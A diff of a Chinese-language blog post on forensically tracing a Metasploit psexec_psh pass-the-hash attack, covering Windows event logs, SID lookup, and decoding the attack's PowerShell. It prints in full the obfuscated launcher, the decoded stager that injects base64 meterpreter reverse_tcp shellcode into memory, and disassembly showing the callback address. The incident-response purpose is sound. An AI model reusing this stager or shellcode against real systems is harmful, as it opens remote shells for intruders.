@@ -201,91 +201,82 @@
         </header>
 
         <div class="post-content">
-            <h1 id="psexec溯源"><a class="markdownIt-Anchor" href="#psexec溯源"></a> Psexec溯源</h1>
-<p>本文目的为记述攻防模拟中Psexec执行后的溯源知识点。</p>
-<h2 id="1-安全日志解析"><a class="markdownIt-Anchor" href="#1-安全日志解析"></a> 1. 安全日志解析</h2>
-<p>使用Metasplot中的<code>/exploit/windows/smb/psexec_psh</code>模块，payload为<code>meterpreter/reverse_tcp</code>进行Pth攻击。</p>
+            <h1 id="Psexec溯源"><a href="#Psexec溯源" class="headerlink" title="Psexec溯源"></a>Psexec溯源</h1><p>本文目的为记述攻防模拟中Psexec执行后的溯源知识点。</p>
+<h2 id="1-安全日志解析"><a href="#1-安全日志解析" class="headerlink" title="1. 安全日志解析"></a>1. 安全日志解析</h2><p>使用Metasplot中的<code>/exploit/windows/smb/psexec_psh</code>模块，payload为<code>meterpreter/reverse_tcp</code>进行Pth攻击。</p>
 <p>在靶机上的日志<code>windows日志-&gt;系统日志-&gt;ID 7045</code>会有执行Psexec的记录</p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325163730525.png" alt="image-20200325163730525"></p>
 <p>查看详细信息，能看到执行的账户信息——<code>SID</code></p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325172725319.png" alt="image-20200325172725319"></p>
 <p>用WMI查询域内的用户信息<code>SID</code></p>
-<pre class="highlight"><code class="cmd"><span class="function">C:\<span class="title">Users</span>\<span class="title">xxx</span>&gt; <span class="title">wmic</span> <span class="title">useraccount</span>  <span class="title">get</span> <span class="title">sid</span>,<span class="title">Caption</span>
-<span class="title">Caption</span>            <span class="title">SID</span>
-<span class="title">GOD</span>\<span class="title">Administrator</span>  <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-500
-<span class="title">GOD</span>\<span class="title">krbtgt</span>         <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-502
-<span class="title">GOD</span>\<span class="title">liukaifeng01</span>   <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-1000
-</span></code></pre>
+<pre><code class="lang-cmd">C:\Users\xxx&gt; wmic useraccount  get sid,Caption
+Caption            SID
+GOD\Administrator  S-1-5-21-2952760202-1353902439-2381784089-500
+GOD\krbtgt         S-1-5-21-2952760202-1353902439-2381784089-502
+GOD\liukaifeng01   S-1-5-21-2952760202-1353902439-2381784089-1000
+</code></pre>
 <p>对照<code>SID</code>可知，是<code>GOD\Administrator</code>执行的远程命令。</p>
 <p>对此，其他安全研究员总结出了其他一些可能会产生的日志，在此作为记录。</p>
 <blockquote>
 <ol>
-<li>
-<p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</p>
+<li><p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</p>
 </li>
-<li>
-<p>还有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p>
+<li><p>还有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p>
 </li>
-<li>
-<p>可执行程序PSEXESVC.EXE将会被提取至Windows目录下，然后再执行远程操作。</p>
+<li><p>可执行程序PSEXESVC.EXE将会被提取至Windows目录下，然后再执行远程操作。</p>
 </li>
 </ol>
 <p><a href="https://kknews.cc/tech/qeqk8py.html" target="_blank" rel="noopener">https://kknews.cc/tech/qeqk8py.html</a></p>
 </blockquote>
-<h2 id="2-解码powershell"><a class="markdownIt-Anchor" href="#2-解码powershell"></a> 2. 解码powershell</h2>
-<p>再来继续追查执行的powershell代码。</p>
-<pre class="highlight"><code class="">服务名称: KyXUNYhzWKXprClF
-%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAAUHe14CA7VW+2/aSBD+uZHyP1gVErZCMA40aSJVujVvggnEQHgUnRZ7bS9Ze8Fe8+r1f78x4DRV07v2pLPyWO/OzM58882MnTiwBOWBtLimnvTl/OxdF4fYl+TMhtRyUmb7JzOUd+9gP+N0htsr6ZMkT9FyWeE+psHs7q4chyEJxPE9XycCRRHx54ySSFakv6Qnj4Tk8mG+IJaQvkiZP/N1xueYncR2ZWx5RLpEgZ2ctbmFE3fy5pJRIWc/f84q00ttlq+uYswiOWvuIkH8vM1YVpG+KsmF/d2SyFmDWiGPuCPyTzQoXuUHQYQd0gFra2IQ4XE7yioQBvyERMRhIB0DSiwcz+UsLLsht5BthySKsjlpmtiezmZ/yNPTxY9xIKhP8s1AkJAvTRKuqUWifAMHNiOPxJmBlilCGrgzRQGxNX8mciaIGctJv2NG7pBNCtuvKsmvlUCqK0IlB6l8K1CD2zEjR9XsG54m+VfgSTkA2H09Pzs/c1LCOA/XndeEgdW76WFNwD25yyN6kPskFXKSAfdgwcMdvGb6YUyU2Qu4UiY0y5Pcz/W1VBhE9x2/CFvTIaf2DFROKc2wtcFXycHPuVkhDg1IZRdgn1op/eS3cCYOI4cg86lYB7ySs6cDYlcIIy4WCXBJun9Qq/pUvOjqMWU2CZEFuYrAK0ij8r0zx1zI2WZgEB9AOr4D/zIOkJ6k0iei79Lbk3cQypYZjqKc1I2h6qycZBLMiJ2TUBDR0xGKBT8ss9/cNWImqIUjkZqbKS9Ani4s8yASYWxB4iD4vrkkFsUswSInNahN9J1J3fTi7JtIlDFjUAtgaQ2ZgJ0EAVMkdAjBx0PqlbxJRNNfMuKDzKH+awy7UO0nxh/4g11iZ39wMWX0kb4JGikMrxyEFJuMi5w0pKGAPpIgmxDpv93/qoMcPSmH5JQNOa2Sqb4TCbcz9npLbhNenqA5ABEKAKEWcl/HEbkuHduF/F59oGUEz7gZMMPSn6mGNlRrGvA7oMUmr9zY961FQw0rW89BzahpNLqVXqNRWrfMYUmY1aa47zaFUR0tFiZqPA7GYtJEjT4tPI9L+2WL7s02ssdb9Xqv7zcFfbtfuLYzrjiOe+OYj9qHGm0/lXt64Qq3K9W4/aRv9EIpqtJNo0cHvedWTczHQ4YHjuqOtFtMt+1wMdS4sW8iVPeK1r7lDOueYe/GDUoWaqFNe6iH0L31OBjU3aVbj5B6O1yV/QVaVcwuRuCdX259YHpvUNPRoKr38APvFi8qqjaxV9XaZIRbPrPrDVUbj5CNQrXvetrNgxckOGFXX+mJDGpPdjUVZLol1Chd0f1k1au7qAoyQ58jXKPPg4sR2Oz0QedpoNkciaA5UtWhq7rIMb0xRjpI6ytU03l597FrdNXh8MrT5s+aBz6T0fqj0UIXNaurquqFP4e/KrKM5TYY6Zubtdsw+T2+x8P1pKhq/U3dQSt0caFr+lw0qsXWGu7tq7eDT+8TBgGFMhy9YsXPOruBw8jDDNgCHTut0xoPa6cm3OU00ZDlw/R+JmFAGMw+mI4p1RFj3EqGwKFdwwA6joVkSg1gWbx6c6VIL4LKt9mQbt3dTcBLKJ4DufNtErjCyxW2xUIBWn1hWypAkL8eWpkvd/LRVi6ZFQDNi212sK0kJZWZs0H19v8F7VTJHvyz/w20b3v/cPpLQBZyScg/bH6/8VuQ/nbgT5gKkDShDzFynIZvx3/ix6sPhkNaIPvO6Uk++h5icdmBD4nzs78BLEJS2GAKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;
-</code></pre>
-<p>代码有点绕，我们可以直接使用 Unit42安全团队的powershell自动反混淆工具</p>
-<p><a href="https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler" target="_blank" rel="noopener">https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler</a></p>
-<pre class="highlight"><code class="">python3 PowerShellProfiler.py -f ./test_power.txt -d
-</code></pre>
-<p>然后就可以直接看到要执行的核心powershell代码</p>
+<h2 id="2-解码powershell"><a href="#2-解码powershell" class="headerlink" title="2. 解码powershell"></a>2. 解码powershell</h2><p>再来继续追查执行的powershell代码。</p>
+<pre><code>服务名称: KyXUNYhzWKXprClF
+%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4){$b=&#39;powershell.exe&#39;}else{$b=$env:windir+&#39;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAAUHe14CA7VW+2/aSBD+uZHyP1gVErZCMA40aSJVujVvggnEQHgUnRZ7bS9Ze8Fe8+r1f78x4DRV07v2pLPyWO/OzM58882MnTiwBOWBtLimnvTl/OxdF4fYl+TMhtRyUmb7JzOUd+9gP+N0htsr6ZMkT9FyWeE+psHs7q4chyEJxPE9XycCRRHx54ySSFakv6Qnj4Tk8mG+IJaQvkiZP/N1xueYncR2ZWx5RLpEgZ2ctbmFE3fy5pJRIWc/f84q00ttlq+uYswiOWvuIkH8vM1YVpG+KsmF/d2SyFmDWiGPuCPyTzQoXuUHQYQd0gFra2IQ4XE7yioQBvyERMRhIB0DSiwcz+UsLLsht5BthySKsjlpmtiezmZ/yNPTxY9xIKhP8s1AkJAvTRKuqUWifAMHNiOPxJmBlilCGrgzRQGxNX8mciaIGctJv2NG7pBNCtuvKsmvlUCqK0IlB6l8K1CD2zEjR9XsG54m+VfgSTkA2H09Pzs/c1LCOA/XndeEgdW76WFNwD25yyN6kPskFXKSAfdgwcMdvGb6YUyU2Qu4UiY0y5Pcz/W1VBhE9x2/CFvTIaf2DFROKc2wtcFXycHPuVkhDg1IZRdgn1op/eS3cCYOI4cg86lYB7ySs6cDYlcIIy4WCXBJun9Qq/pUvOjqMWU2CZEFuYrAK0ij8r0zx1zI2WZgEB9AOr4D/zIOkJ6k0iei79Lbk3cQypYZjqKc1I2h6qycZBLMiJ2TUBDR0xGKBT8ss9/cNWImqIUjkZqbKS9Ani4s8yASYWxB4iD4vrkkFsUswSInNahN9J1J3fTi7JtIlDFjUAtgaQ2ZgJ0EAVMkdAjBx0PqlbxJRNNfMuKDzKH+awy7UO0nxh/4g11iZ39wMWX0kb4JGikMrxyEFJuMi5w0pKGAPpIgmxDpv93/qoMcPSmH5JQNOa2Sqb4TCbcz9npLbhNenqA5ABEKAKEWcl/HEbkuHduF/F59oGUEz7gZMMPSn6mGNlRrGvA7oMUmr9zY961FQw0rW89BzahpNLqVXqNRWrfMYUmY1aa47zaFUR0tFiZqPA7GYtJEjT4tPI9L+2WL7s02ssdb9Xqv7zcFfbtfuLYzrjiOe+OYj9qHGm0/lXt64Qq3K9W4/aRv9EIpqtJNo0cHvedWTczHQ4YHjuqOtFtMt+1wMdS4sW8iVPeK1r7lDOueYe/GDUoWaqFNe6iH0L31OBjU3aVbj5B6O1yV/QVaVcwuRuCdX259YHpvUNPRoKr38APvFi8qqjaxV9XaZIRbPrPrDVUbj5CNQrXvetrNgxckOGFXX+mJDGpPdjUVZLol1Chd0f1k1au7qAoyQ58jXKPPg4sR2Oz0QedpoNkciaA5UtWhq7rIMb0xRjpI6ytU03l597FrdNXh8MrT5s+aBz6T0fqj0UIXNaurquqFP4e/KrKM5TYY6Zubtdsw+T2+x8P1pKhq/U3dQSt0caFr+lw0qsXWGu7tq7eDT+8TBgGFMhy9YsXPOruBw8jDDNgCHTut0xoPa6cm3OU00ZDlw/R+JmFAGMw+mI4p1RFj3EqGwKFdwwA6joVkSg1gWbx6c6VIL4LKt9mQbt3dTcBLKJ4DufNtErjCyxW2xUIBWn1hWypAkL8eWpkvd/LRVi6ZFQDNi212sK0kJZWZs0H19v8F7VTJHvyz/w20b3v/cPpLQBZyScg/bH6/8VuQ/nbgT5gKkDShDzFynIZvx3/ix6sPhkNaIPvO6Uk++h5icdmBD4nzs78BLEJS2GAKAAA=&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;
+</code></pre><p>代码有点绕，我们可以直接使用 Unit42安全团队的powershell自动反混淆工具 </p>
+<p><a href="https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler" target="_blank" rel="noopener">https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler</a> </p>
+<pre><code>python3 PowerShellProfiler.py -f ./test_power.txt -d
+</code></pre><p>然后就可以直接看到要执行的核心powershell代码</p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325164205204.png" alt="image-20200325164205204"></p>
 <p>当然我们也可以按照函数的本意，在这里 <a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener">https://gchq.github.io/CyberChef</a> 按照代码逻辑一步一步decode。</p>
 <p>锻炼一下动手能力 ：)</p>
 <p>FromBase64 + Gunzip</p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325164827994.png" alt="image-20200325164827994"></p>
 <p>于是我们得到核心powershell代码，如下：</p>
-<pre class="highlight"><code class="powershell"><span class="keyword">function</span> j6ih {
-    <span class="keyword">Param</span> (<span class="variable">$weF</span>, <span class="variable">$x_lM</span>)		
-    <span class="variable">$fNVx2</span> = ([AppDomain]::CurrentDomain.GetAssemblies() | Where - Object {
-        <span class="variable">$_</span>.GlobalAssemblyCache  - And <span class="variable">$_</span>.Location.Split(<span class="string">'\\'</span>)[ - <span class="number">1</span>].Equals(<span class="string">'System.dll'</span>) 
+<pre><code class="lang-powershell">function j6ih {
+    Param ($weF, $x_lM)        
+    $fNVx2 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where - Object {
+        $_.GlobalAssemblyCache  - And $_.Location.Split(&#39;\\&#39;)[ - 1].Equals(&#39;System.dll&#39;) 
     }
 
-    ).GetType(<span class="string">'Microsoft.Win32.UnsafeNativeMethods'</span>)
-    <span class="keyword">return</span> <span class="variable">$fNVx2</span>.GetMethod(<span class="string">'GetProcAddress'</span>, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke(<span class="literal">$null</span>, @([System.Runtime.InteropServices.HandleRef](New - Object System.Runtime.InteropServices.HandleRef((New - Object IntPtr), (<span class="variable">$fNVx2</span>.GetMethod(<span class="string">'GetModuleHandle'</span>)).Invoke(<span class="literal">$null</span>, @(<span class="variable">$weF</span>)))), <span class="variable">$x_lM</span>))
+    ).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)
+    return $fNVx2.GetMethod(&#39;GetProcAddress&#39;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New - Object System.Runtime.InteropServices.HandleRef((New - Object IntPtr), ($fNVx2.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($weF)))), $x_lM))
 }
 
-<span class="keyword">function</span> fO6N {
-    <span class="keyword">Param</span> (
-    [Parameter(Position = <span class="number">0</span>, Mandatory = <span class="literal">$True</span>)] [Type[]] <span class="variable">$rSCZ</span>, [Parameter(Position = <span class="number">1</span>)] [Type] <span class="variable">$zNm3</span> = [Void]
+function fO6N {
+    Param (
+    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $rSCZ, [Parameter(Position = 1)] [Type] $zNm3 = [Void]
     )
-    <span class="variable">$lvMoq</span> = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New - Object System.Reflection.AssemblyName(<span class="string">'ReflectedDelegate'</span>)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(<span class="string">'InMemoryModule'</span>, <span class="literal">$false</span>).DefineType(<span class="string">'MyDelegateType'</span>, <span class="string">'Class, Public, Sealed, AnsiClass, AutoClass'</span>, [System.MulticastDelegate])
-    <span class="variable">$lvMoq</span>.DefineConstructor(<span class="string">'RTSpecialName, HideBySig, Public'</span>, [System.Reflection.CallingConventions]::Standard, <span class="variable">$rSCZ</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)
-    <span class="variable">$lvMoq</span>.DefineMethod(<span class="string">'Invoke'</span>, <span class="string">'Public, HideBySig, NewSlot, Virtual'</span>, <span class="variable">$zNm3</span>, <span class="variable">$rSCZ</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)
-    <span class="keyword">return</span> <span class="variable">$lvMoq</span>.CreateType()
+    $lvMoq = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New - Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])
+    $lvMoq.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $rSCZ).SetImplementationFlags(&#39;Runtime, Managed&#39;)
+    $lvMoq.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $zNm3, $rSCZ).SetImplementationFlags(&#39;Runtime, Managed&#39;)
+    return $lvMoq.CreateType()
 }
 
-[Byte[]]<span class="variable">$dvxe9</span> = [System.Convert]::FromBase64String(<span class="string">"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqDSPaAIAHmCJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U="</span>)
+[Byte[]]$dvxe9 = [System.Convert]::FromBase64String(&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqDSPaAIAHmCJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=&quot;)
 
-<span class="variable">$oA</span> = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll VirtualAlloc), (fO6N @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, <span class="variable">$dvxe9</span>.Length, <span class="number">0</span>x3000, <span class="number">0</span>x40)
-[System.Runtime.InteropServices.Marshal]::Copy(<span class="variable">$dvxe9</span>, <span class="number">0</span>, <span class="variable">$oA</span>, <span class="variable">$dvxe9</span>.length)
-<span class="variable">$blUE9</span> = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll CreateThread), (fO6N @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, <span class="number">0</span>, <span class="variable">$oA</span>, [IntPtr]::Zero, <span class="number">0</span>, [IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll WaitForSingleObject), (fO6N @([IntPtr], [Int32]))).Invoke(<span class="variable">$blUE9</span>, <span class="number">0</span>xffffffff) | Out - Null
+$oA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll VirtualAlloc), (fO6N @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dvxe9.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($dvxe9, 0, $oA, $dvxe9.length)
+$blUE9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll CreateThread), (fO6N @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $oA, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll WaitForSingleObject), (fO6N @([IntPtr], [Int32]))).Invoke($blUE9, 0xffffffff) | Out - Null
 </code></pre>
-<h2 id="3-shellcode"><a class="markdownIt-Anchor" href="#3-shellcode"></a> 3. ShellCode</h2>
-<p>从<code>kernel32.dll</code>和<code>VirtualAlloc</code>容易判断出，变量<code>$dvxe9</code>是Base64后的Shellcode。</p>
+<h2 id="3-ShellCode"><a href="#3-ShellCode" class="headerlink" title="3. ShellCode"></a>3. ShellCode</h2><p>从<code>kernel32.dll</code>和<code>VirtualAlloc</code>容易判断出，变量<code>$dvxe9</code>是Base64后的Shellcode。</p>
 <p>用python Base64解一下，变成<code>\x00\xff\x12\x33</code>这样的十六进制格式，方便后续解码。</p>
-<pre class="highlight"><code class="python"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> d
-<span class="meta">&gt;&gt;&gt; </span>code = <span class="string">""</span>
-<span class="meta">&gt;&gt;&gt; </span>print(<span class="string">""</span>.join(list(map(<span class="keyword">lambda</span> y:<span class="string">"\\x%x"</span>%y,d(code)))))
+<pre><code class="lang-python">&gt;&gt;&gt; from base64 import b64decode as d
+&gt;&gt;&gt; code = &quot;&quot;
+&gt;&gt;&gt; print(&quot;&quot;.join(list(map(lambda y:&quot;\\x%x&quot;%y,d(code)))))
 </code></pre>
 <p>存文件丢IDA或者直接放在线网站解shellcode</p>
-<p><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" rel="noopener">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p>
+<p> <a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" rel="noopener">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a> </p>
 <p>得到汇编</p>
-<pre class="highlight"><code class="asm">0x0000000000000000:  FC                   cld    
+<pre><code class="lang-asm">0x0000000000000000:  FC                   cld    
 0x0000000000000001:  E8 82 00 00 00       call   0x88
 0x0000000000000006:  60                   pushal 
 0x0000000000000007:  89 E5                mov    ebp, esp
@@ -442,7 +433,7 @@
 0x0000000000000168:  FF D5                call   ebp
 </code></pre>
 <p>显然，这是msf的生成的默认shellcode，其中在偏移<code>0x000af</code>和<code>0x000b4</code>处，分别为反弹的十六进制IP地址以及端口</p>
-<pre class="highlight"><code class="asm">0x00000000000000ad:  6A 0A                push   0xa
+<pre><code class="lang-asm">0x00000000000000ad:  6A 0A                push   0xa
 0x00000000000000af:  68 C0 A8 34 8F       push   0x8f34a8c0
 0x00000000000000b4:  68 02 00 11 46       push   0x601e0002
 0x00000000000000b9:  89 E6                mov    esi, esp
@@ -462,9 +453,7 @@
 <p><img src="/2020/03/01/Psexec溯源/image-20200325170854141.png" alt="image-20200325170854141"></p>
 <p>唯一要注意的是参数是小端存储的</p>
 <p>于是我们在溯源时可以按步骤提取，寻找上一个跳板机，说不定会有更大的收获呢。</p>
-<h2 id="4-补充"><a class="markdownIt-Anchor" href="#4-补充"></a> 4. 补充</h2>
-<h3 id="41-cs的psexecbind_smb_listener"><a class="markdownIt-Anchor" href="#41-cs的psexecbind_smb_listener"></a> 4.1 CS的Psexec(bind_smb_listener)</h3>
-<p>另外，CS中的<code>Psexec</code>和<code>Psexec(psh)</code>的执行原理基本同上（使用的是<code>bind_smb_listener</code>，如果使用其他<code>listener</code>则数据通道部分会不同）</p>
+<h2 id="4-补充"><a href="#4-补充" class="headerlink" title="4. 补充"></a>4. 补充</h2><h3 id="4-1-CS的Psexec-bind-smb-listener"><a href="#4-1-CS的Psexec-bind-smb-listener" class="headerlink" title="4.1 CS的Psexec(bind_smb_listener)"></a>4.1 CS的Psexec(bind_smb_listener)</h3><p>另外，CS中的<code>Psexec</code>和<code>Psexec(psh)</code>的执行原理基本同上（使用的是<code>bind_smb_listener</code>，如果使用其他<code>listener</code>则数据通道部分会不同）</p>
 <ol>
 <li>远程创建服务（随机服务名）；</li>
 <li>启动服务调用<code>%ComSpec%</code>(cmd.exe)，运行powershell脚本，脚本会本地创建用于传输Stager的通道<code>staus_xxx</code>以及后续数据传输管道<code>msagent_xxx</code>；</li>
@@ -543,20 +532,5 @@
 <script>hljs.highlightAll();</script>
 
     </div>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
